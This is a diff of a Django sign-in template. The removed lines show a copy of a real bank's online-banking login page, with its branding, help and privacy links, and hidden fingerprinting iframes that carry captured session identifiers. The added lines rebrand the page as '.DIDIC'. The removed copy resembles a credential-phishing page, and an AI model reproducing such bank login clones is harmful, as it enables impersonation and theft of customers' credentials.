@@ -1,64 +1,16 @@
+{% extends './BaseTemp/base2.html' %}
 {% load static %}
-<html lang="en"><head>
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta data-appid="CeB">
 
-    <!-- Latest minified CSS -->
+{% block content %}
 
-   
-    <script type="text/javascript">window.name = "";</script>
-
-    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
-    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
-    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
-
-
-    <title>Sign in to .COMmunity Banking</title>
-
-    
-    
-    <style>
-        .card-header .fa {
-            transition: .3s transform ease-in-out;
-        }
-        .card-header .collapsed .fa {
-            transform: rotate(90deg);
-        }
-        body{
-            background-image: url("{% static 'assets/images/chicago.jpg' %}");
-            background-color: transparent;
-        }
-    </style>
-
-</head>
-<body>
-    <nav class="" style="min-height:40px; background-color:#003E7E; margin-top: 30px;" >
-        <div class="mx-auto" style="max-width:540px; width:100%;">
-            <img  width="195" src="{% static 'assets/images/b380_Wintrust.svg' %}" />
-        </div>
-       
-    </nav>
-
-    <br/>
-
-	<header>
-        <a id="skippy" class="sr-only sr-only-focusable" href="#secureHideArea"><span class="skiplink-text">Skip to main content</span></a>
-		<div class="fis-header-content"><a class="brandedImageLink" title="Wintrust Bank" href="http://www.wintrustbank.com"><img id="_BankLogo" class="" title="Wintrust Bank" alt="" src="{% static '' %}"></a></div>
-	</header>
-
-
-
-	<div id="content" class="card mx-auto" style="max-width: 540px;">
+	<div id="content" class="card mx-auto" style="max-width: 540px; margin: 40px;">
 		<div class="">
             <div id="secureHideArea" class="container secureHideArea" role="main" tabindex="-1">
                 <div><div class="fis-banner-danger"><table role="presentation"><tbody><tr><td><span class="icon-Error med-ic"></span></td><td><span class="message">
                     <b>{{error}}</b>
                 </span></td></tr></tbody></table></div></div>
                 <div class="row">
-                    <h1 class="col-sm-12">Sign in to <span class="productName">.COMmunity Banking</span></h1>
+                    <h1 class="col-sm-12">Sign in to <span class="productName">.DIDIC</span></h1>
                 </div>
                 
 
@@ -76,25 +28,9 @@
     </div>
 </form>
     <hr>
-    <div class="row navigation" role="navigation"><div class="col-sm w-100"> <p><b>Need help?</b><br>Contact us at 877-650-9905</p><p><b>Not yet enrolled in .COMmunity Banking?</b><br>If you are a customer of Wintrust Bank-Chicago or North Shore Community Bank &amp; Trust or Evanston Community Bank &amp; Trust, <a href="https://cibng.ibanking-services.com/cib/themes/cib_enroll/enroll/enroll.jsp?FIORG=380&amp;FIFID=071925444">click here to sign up</a>.<br>If you bank with another Wintrust Community Bank, please <a href="http://www.wintrustbank.com/online-banking-signup">click here</a>.</p><p><b>We promise to keep your personal information private and secure.</b><br>To learn more, please see our <a href="http://privacy.wintrustbank.com/" target="_blank">privacy policy.</a></p><p></p><table width="100%" cellpadding="0" cellspacing="0" border="0">
-<tbody><tr><td><a href="http://www.wintrustbank.com/" target="_blank">Visit our home page</a><br></td></tr>
-<tr><td><br><b>Security Reminder:</b> We will never ask you for sensitive information including Social Security number, account numbers and online banking ID/password in an unsolicited communication (such as an email, phone call, or text message). We also will not ask you on our websites to verify sensitive personal or account information.<br><br>If you receive any unusual requests to re-enter or verify sensitive information during an online banking session or if you need to report a suspicious communication, please email us at <a id="homelink" href="mailto:reportfraud@wintrust.com">reportfraud@wintrust.com</a>, or contact your banker. To learn more about preventing fraud and identity theft, visit our online security page at <a href="http://www.wintrust.com/security" target="new_window">http://www.wintrust.com/security</a>.<br></td></tr>
-</tbody></table><p></p> </div></div>
-
-
-            </div>
-		</div>
-	</div>
+   </div>
 
     
-        <div class="fis-threatmetrix-profile" role="presentation"><p style=""></p><img onerror="this.style.display = 'none'" src="" alt=""><script src="" type="text/javascript"></script><object tabindex="-1" alt="" type="application/x-shockwave-flash" data="" width="1" height="1" id="obj_id"><param name="movie" value=""><div></div></object></div>
-        <div id="tm_config" class="d-none" data-waittimeout="5" data-form="#credential" data-submit="#signin" data-selfpostingform="0">
-        </div>
-    
-
-    
-    
+{%  endblock %}  
 
 
-
-<iframe id="tdr_92Dl7" title="empty" aria-disabled="true" aria-hidden="true" width="0" height="0" tabindex="-1" style="color:rgba(0,0,0,0); float:left; position:absolute; top:-200; left:-200; border:0px" src="https://content.ibanking-services.com/fp/ls_fp.html;CIS3SID=B51375D8751D7C5B316CD021F7AAC24D?org_id=qn4omaj3&amp;session_id=b07c75f37d934f70a443217c73eb70ee&amp;nonce=d461000d4e14e70b&amp;pageid=1"></iframe><iframe id="tdr_JJBiK" title="empty" aria-disabled="true" aria-hidden="true" width="0" height="0" tabindex="-1" style="color:rgba(0,0,0,0); float:left; position:absolute; top:-200; left:-200; border:0px" src="https://h.online-metrix.net/fp/sid_fp.html;CIS3SID=B51375D8751D7C5B316CD021F7AAC24D?org_id=qn4omaj3&amp;session_id=b07c75f37d934f70a443217c73eb70ee&amp;nonce=d461000d4e14e70b&amp;pageid=1"></iframe><iframe id="tdr_bL6nz" title="empty" aria-disabled="true" aria-hidden="true" width="0" height="0" tabindex="-1" style="color:rgba(0,0,0,0); float:left; position:absolute; top:-200; left:-200; border:0px" src="https://content.ibanking-services.com/fp/top_fp.html;CIS3SID=B51375D8751D7C5B316CD021F7AAC24D?org_id=qn4omaj3&amp;session_id=b07c75f37d934f70a443217c73eb70ee&amp;nonce=d461000d4e14e70b&amp;pageid=1"></iframe></body><grammarly-desktop-integration data-grammarly-shadow-root="true"></grammarly-desktop-integration></html>
